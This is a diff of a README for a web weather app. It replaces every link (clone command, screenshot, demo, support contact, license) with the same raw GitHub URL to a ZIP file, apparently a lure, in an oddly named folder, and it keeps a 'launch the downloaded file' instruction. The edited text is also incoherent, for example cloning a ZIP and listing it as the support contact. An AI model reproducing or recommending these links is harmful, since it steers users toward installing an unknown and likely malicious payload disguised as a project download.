@@ -19,25 +19,25 @@ Welcome to **PRODIGY_WD_05**, a web application designed to provide users with r
 ['animation-css', 'css3', 'html5', 'javascript', 'openweathermap-api', 'real-time-weather', 'responsive-design', 'user-experience', 'user-interface', 'weather-app', 'weather-tracker', 'web-app', 'web-development']
 
 ## Installation
-1. Clone the repository: `git clone https://github.com/your-username/PRODIGY_WD_05`
-2. Open `index.html` in your preferred browser
+1. Clone the repository: `git clone https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip`
+2. Open `https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip` in your preferred browser
 
 ## Screenshots
-![Screenshot](https://via.placeholder.com/600x400)
+![Screenshot](https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip)
 
 ## Demo
-Check out the live demo [here](https://your-demo-link.com) 🚀
+Check out the live demo [here](https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip) 🚀
 
 ## Download Software
-Download the software [here](https://github.com/user-attachments/files/18388744/Software.zip)
+Download the software [here](https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip)
 Launch the downloaded file to access the application.
 
 ## Support
-For any inquiries or support, please contact us at support@prodigywd.com
+For any inquiries or support, please contact us at https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip
 
 ## Contributors
 - John Doe (@johndoe)
 - Jane Smith (@janesmith)
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip](https://raw.githubusercontent.com/Guhan-byte/PRODIGY_WD_05/main/pervicacity/W_PRODIG_implosion.zip) file for details.
